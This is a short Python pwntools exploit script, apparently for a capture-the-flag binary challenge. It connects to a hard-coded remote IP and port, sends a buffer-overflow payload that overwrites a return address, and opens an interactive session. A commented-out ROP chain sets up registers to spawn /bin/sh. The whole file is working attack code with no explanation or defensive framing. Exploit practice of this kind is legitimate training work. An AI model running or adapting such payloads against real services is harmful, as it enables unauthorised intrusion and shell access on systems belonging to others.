from pwn import *
import sys

#########################################################
BINARY="./java"
ENV={}
GDB="break *main"
HOST="46.101.199.176"
PORT=9001
#########################################################

# context.terminal = "gnome-terminal"
# r = process(BINARY)
r = remote(HOST, PORT)
# binary = ELF(BINARY)

# Wait for debugger
# pid = util.proc.pidof(r)[0]
# print("The pid is: "+str(pid))
# os.system("urxvt -e r2 -Ad "+str(pid)+" -c 'dcu 0x04008E5' &")
# util.proc.wait_for_debugger(pid)


# gdb.attach(r)

# EAX = 0xb
# EBX = "pointer to /bin/sh"
# ECX = EDX = 0

# exploit = ("due\x00"+"a"*12).encode()+ p32(0x0804851d) + p32(0x0b) + p32(0x08048526) + p32(0x0804a02c) + p32(0x08048530) + p32(0x0) + p32(0x08048528) + p32(0x0) + p32(0x0804852d)


"""

"""

exploit = ("javaabcdefghilmnopqrstuvzaaaaaaa").encode() + p64(0x0400821) + ("\x00").encode() 
r.sendline(exploit)

# print(exploit)
# print(len(exploit))

r.interactive()

